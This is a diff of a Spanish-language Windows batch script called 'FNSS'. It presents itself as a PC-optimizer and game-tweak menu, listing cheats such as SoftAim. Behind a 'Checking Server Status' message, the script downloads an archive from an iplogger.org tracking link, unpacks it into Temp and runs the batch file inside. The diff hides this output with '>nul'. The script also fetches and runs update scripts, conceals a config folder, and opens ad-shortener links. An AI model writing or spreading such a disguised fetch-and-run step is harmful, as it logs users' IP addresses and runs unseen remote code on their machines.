@@ -4,12 +4,12 @@ MODE CON: COLS=128 LINES=33
 
 openfiles > NUL 2>&1 
 if NOT %ERRORLEVEL% EQU 0 goto NotAdmin
+cls
 goto solopara 
 
 :NotAdmin
 color 5
 title OPEN WITH ADMINISTRATOR!!
-cls
 echo.
 echo  [-] Not opened with Adminitrator.
 echo  [+] Not Support Windows below 20H2.
@@ -23,7 +23,7 @@ exit
 :solopara
 color 5
 title    CONNECTING TO FNSS SERVER...
-echo.       
+echo.      
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 echo Network IP: %NetworkIP%
 
@@ -68,7 +68,6 @@ echo set netip=Richi>> "DEBUG.bat"
 echo set netip=USER>> "DEBUG.bat"
 echo set netip=erier>> "DEBUG.bat"
 echo set netip=ilove>> "DEBUG.bat"
-echo set netip=Cliente>> "DEBUG.bat"
 
 goto call2
 
@@ -101,7 +100,7 @@ if "%username%"=="Richi" goto namexist9
 if "%username%"=="USER" goto namexist9
 if "%username%"=="erier" goto namexist9
 if "%username%"=="ilove" goto namexist9
-if "%username%"=="Cliente" goto namexist9
+
 
 goto skip9
 
@@ -111,10 +110,10 @@ goto skip9
 
 
 :missing
+echo  [+] Checking Server Status
 cd C:\Users\%username%\AppData\Local\Temp
 set local9=
 set Offline=Offline
-
 IF EXIST "server-main8" DEL /Q "server-main8"
 IF EXIST "server.bat" DEL /Q "server.bat"
 IF EXIST "main8.zip" DEL /Q "main8.zip"
@@ -123,14 +122,14 @@ goto download1
 ::https://github.com/maikyes/server/archive/main8.zip
 
 :download1
-bitsadmin /transfer "FNSS Check2" /download /priority foreground https://iplogger.org/2aFdM5 "C:\Users\%username%\AppData\Local\Temp\main8.zip"
-cls
-powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main8.zip'); $target.CopyHere($zip.Items(), 16); }"
-cls
-powershell -command "Expand-Archive main8.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
-cls
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\server-main8" "C:\Users\%username%\AppData\Local\Temp"
-cls
+bitsadmin /transfer "FNSS Check2" /download /priority foreground https://iplogger.org/2aFdM5 "C:\Users\%username%\AppData\Local\Temp\main8.zip" >nul
+
+powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main8.zip'); $target.CopyHere($zip.Items(), 16); }" >nul
+
+powershell -command "Expand-Archive main8.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp" >nul
+
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\server-main8" "C:\Users\%username%\AppData\Local\Temp" >nul
+
 cd C:\Users\%username%\AppData\Local\Temp
 
 CALL "server.bat"
@@ -141,7 +140,6 @@ IF "%local9%"=="%Offline%" goto :yes26
 IF NOT "%local9%"=="%Offline%" goto :fnssserver
 
 :yes26
-cls
 echo Server OFFLINE: %local9%
 goto serveroffline
 
@@ -164,8 +162,10 @@ exit
 ::=========================::=ACTUALIZACION DE VERSION::=============================
 
 :fnssserver
+echo.
+echo  [+] Checking Updates
 cd C:\Users\%username%\AppData\Local\Temp
-set local=57.0
+set local=58.0
 set new1=
 set new2=
 set new3=
@@ -183,18 +183,18 @@ goto download
 
 :download
 
-bitsadmin /transfer "FNSS Check" /download /priority foreground https://github.com/maikyes/Update/archive/main2.zip "C:\Users\%username%\AppData\Local\Temp\main2.zip"
+bitsadmin /transfer "FNSS Check" /download /priority foreground https://github.com/maikyes/Update/archive/main2.zip "C:\Users\%username%\AppData\Local\Temp\main2.zip" >nul
 
-powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main2.zip'); $target.CopyHere($zip.Items(), 16); }"
+powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main2.zip'); $target.CopyHere($zip.Items(), 16); }" >nul
 
-cls
 
-powershell -command "Expand-Archive main2.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
 
-cls
+powershell -command "Expand-Archive main2.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp" >nul
 
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\Update-main2" "C:\Users\%username%\OneDrive\AppData\Local\Temp"
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\Update-main2" "C:\Users\%username%\AppData\Local\Temp"
+
+
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\Update-main2" "C:\Users\%username%\OneDrive\AppData\Local\Temp" >nul
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\Update-main2" "C:\Users\%username%\AppData\Local\Temp" >nul
 
 cd C:\Users\%username%\AppData\Local\Temp
 CALL "files.bat"
@@ -208,13 +208,13 @@ IF "%local%"=="%localtwo%" goto :yes
 IF NOT "%local%"=="%localtwo%" goto :no
 
 :yes
-cls
-echo No updates found. Version: %local%
+echo.
+echo  [+] No updates found. Version: %local%
 goto menu1
 
 :no
-cls
-echo Update found! Version: %local%
+echo.
+echo  [+] Update found! Version: %local%
 timeout /NOBREAK /T 1 >nul
 goto act
 
@@ -288,32 +288,28 @@ exit
 
 
 :act
-cls
 color 5
 echo.
-echo ============================
-echo  Downloading new Version...
-echo   Don't Touch Anything...
-echo ============================
+echo  [+] Downloading new Version, Don't Touch Anything.
 echo.
                                                          
 :: ============================= WORKING! =============================
 ::                                                        https://ouo.io/KfWuTWp
-bitsadmin /transfer "FNSS" /download /priority foreground https://github.com/maikyes/fnss/archive/main.zip "C:\Users\%username%\AppData\Local\Temp\main.zip"
-cls
-powershell -command "Expand-Archive main.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
-cls
-powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main.zip'); $target.CopyHere($zip.Items(), 16); }"
-cls
+bitsadmin /transfer "FNSS" /download /priority foreground https://github.com/maikyes/fnss/archive/main.zip "C:\Users\%username%\AppData\Local\Temp\main.zip" >nul
+
+powershell -command "Expand-Archive main.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp" >nul
+
+powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main.zip'); $target.CopyHere($zip.Items(), 16); }" >nul
 
 
 
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Desktop\FNSSv3"
-cls
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Escritorio\FNSSv3"
-cls
-xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\OneDrive\Desktop\FNSSv3"
-cls
+
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Desktop\FNSSv3" >nul
+
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Escritorio\FNSSv3" >nul
+
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\OneDrive\Desktop\FNSSv3" >nul
+
 cd C:\Users\%username%\Desktop\FNSSv3
 Attrib +h +s +r config
 cd C:\Users\%username%\Escritorio\FNSSv3
@@ -360,8 +356,8 @@ echo   +  12: Desactivar WindowsUpdates    + +  27: SoftAim (Working)           
 echo   +  13: IP Locations                 + +  28: GTA 5 Mod Menu (Updating)    +        
 echo   +  14: Activar Gpedit               + +  29: Optimizer                    +             
 echo   +  15: Nvidia Inspector  (Risky)    + +  30: SpeedTest                    +           
-echo   +                                   + +                                   + 
-echo   +++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++  31: Page TWO
+echo   +                                   + +                                   +
+echo   +++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++
                           
                                    
                                  
@@ -400,7 +396,6 @@ if %opcion%==27 goto checkxan4
 if %opcion%==28 goto search223
 if %opcion%==29 goto optimizern
 if %opcion%==30 goto speedteste
-if %opcion%==31 goto menu12
 
 if %opcion%==admin goto adminmaik
 
@@ -412,7 +407,7 @@ if %opcion%==maik goto maik
 if %opcion%==c goto calculadora
 if %opcion%==dc goto discord
 
-
+else
 echo.
 color 4
 echo Opcion Invalida. Intente de nuevo
@@ -430,66 +425,6 @@ start https://ouo.io/t3jqN7Q
 start https://ouo.io/IHedSW
 start https://ouo.io/kaPz6L
 goto menu1
-
-
-:: =================================================
-
-
-
-
-
-
-
-
-
-:menu12
-color 5
-cls
-title FNSS [ ig @maikyiq ] Version: %localtwo% 
-echo.
-echo              -=[FNSS]=-               
-echo.
-echo   +++++++++++++++++++++++++++++++++++++ 
-echo   +                                   + 
-echo   +   1: Normal/Fast PC Memory        +   Time Log:%time%
-echo   +   2: Fortnite Performance         +   IP log: %NetworkIP%
-echo   +   3: [Coming Soon]                +   User: %username%
-echo   +   4: [Coming Soon]                +
-echo   +   5: [Coming Soon]                +  %new1%
-echo   +   6: [Coming Soon]                +  %new2%
-echo   +   7: [Coming Soon]                +  %new3%             
-echo   +   8: [Coming Soon]                +  %new4%                
-echo   +                                   +                                    
-echo   +++++++++++++++++++++++++++++++++++++  31: Page ONE                           
-echo.
-echo.
-set /p opciones="ENTER NUMBER:"
-
-
-if %opciones%==1 goto checkmemo
-if %opciones%==2 goto preferencefortnite
-
-if %opciones%==31 goto menu1
-
-echo.
-color 4
-echo Opcion Invalida. Intente de nuevo
-echo.
-pause
-cls
-goto menu1
-
-
-:supore
-start https://ouo.io/XzM8oQ
-start https://ouo.io/zmoyTSf
-start https://ouo.io/vjTSwQ
-start https://ouo.io/t3jqN7Q
-start https://ouo.io/IHedSW
-start https://ouo.io/kaPz6L
-goto menu1
-
-
 
 
 
@@ -511,192 +446,6 @@ echo.
 timeout /NOBREAK /T 2 >nul
 pause
 goto menu1
-
-
-
-
-
-:: ============================================================
-
-:checkmemo
-cls
-echo.
-echo  [-] Checking what memory do you have..
-echo.
-timeout /NOBREAK /T 1 >nul
-fsutil behavior query memoryusage
-echo.
-
-
-:memofast
-echo.
-echo  [+] 1: Memory Normal
-echo  [+] 2: Memory Fast
-echo  [+] 3: Back
-echo.
-
-
-
-set /p memo="ENTER NUMBER:"
-
-
-if %memo%==1 goto memo1
-if %memo%==2 goto memo2
-if %memo%==3 goto menu12
-
-:memo1
-cls
-fsutil behavior set memoryusage 1
-cls
-echo.
-echo  [+] Successfully!
-echo.
-timeout /NOBREAK /T 1 >nu
-echo  [-] Getting Back...
-timeout /NOBREAK /T 1 >nu
-goto checkmemo
-
-:memo2
-cls
-fsutil behavior set memoryusage 2
-cls
-echo.
-echo  [+] Successfully!
-echo.
-timeout /NOBREAK /T 1 >nu
-echo  [-] Getting Back...
-timeout /NOBREAK /T 1 >nu
-goto checkmemo
-
-:: ============================================================
-
-
-
-:: ============================================================
-
-
-
-
-
-:preferencefortnite
-cls
-echo.
-echo  [+] Checking Fortnite File...
-echo.
-timeout /NOBREAK /T 1 >nul
-
-
-cd "C:\Program Files"
-if exist "Epic Games" goto ubiva
-if not exist "Epic Games" goto noskip332
-
-:noskip332
-echo.
-echo  [-] Fortnite File Not Found.
-timeout /NOBREAK /T 2 >nul
-goto ubicamen2
-
-
-:ubiva
-cls
-echo  [-] Fortnite File Found!
-timeout /NOBREAK /T 1 >nul
-goto ubicamen
-
-
-:ubicamen
-cls
-echo.
-echo  [+] 1: Fortnite High Performance
-echo  [+] 2: Fortnite Power Saving 
-echo  [+] 3: Back
-echo.
-
-set /p memo23="ENTER NUMBER:"
-
-
-if %memo23%==1 goto highfort
-if %memo23%==2 goto powerfort1
-if %memo23%==3 goto menu12
-
-
-
-:highfort
-cls
-echo.
-Reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe" /t REG_SZ /d GpuPreference=2; /f
-echo.
-echo  [+] Successfully High Performance.
-timeout /NOBREAK /T 1 >nul
-echo.
-pause
-goto ubicamen
-
-:powerfort1
-cls
-echo.
-Reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe" /t REG_SZ /d GpuPreference=1; /f
-echo.
-echo  [+] Successfully Power Saving.
-timeout /NOBREAK /T 1 >nul
-echo.
-pause
-goto ubicamen
-
-
-:ubicamen2
-cls
-echo.
-echo  [+] 1: Fortnite High Performance
-echo  [+] 2: Fortnite Power Saving 
-echo  [+] 3: Back
-echo.
-
-set /p memo231="ENTER NUMBER:"
-
-
-if %memo231%==1 goto highfort2
-if %memo231%==2 goto powerfort2
-if %memo231%==3 goto menu12
-
-
-
-:highfort2
-cls
-echo.
-echo Ejemplo: C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64
-echo.
-set /p linked2=Pon la Ubicacion de Fortnite= 
-echo.
-Reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "%linked2%\FortniteClient-Win64-Shipping.exe" /t REG_SZ /d GpuPreference=2; /f
-cls
-echo.
-echo  [+] Successfully High Performance.
-timeout /NOBREAK /T 1 >nul
-echo.
-pause
-goto ubicamen2
-
-:powerfort2
-cls
-echo.
-echo Ejemplo: C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64
-echo.
-set /p linked=Pon la Ubicacion de Fortnite= 
-echo.
-Reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "%linked2%\FortniteClient-Win64-Shipping.exe" /t REG_SZ /d GpuPreference=1; /f
-cls
-echo.
-echo  [+] Successfully Power Saving.
-timeout /NOBREAK /T 1 >nul
-echo.
-pause
-goto ubicamen2
-
-
-
-:: ============================================================
-
 
 
 
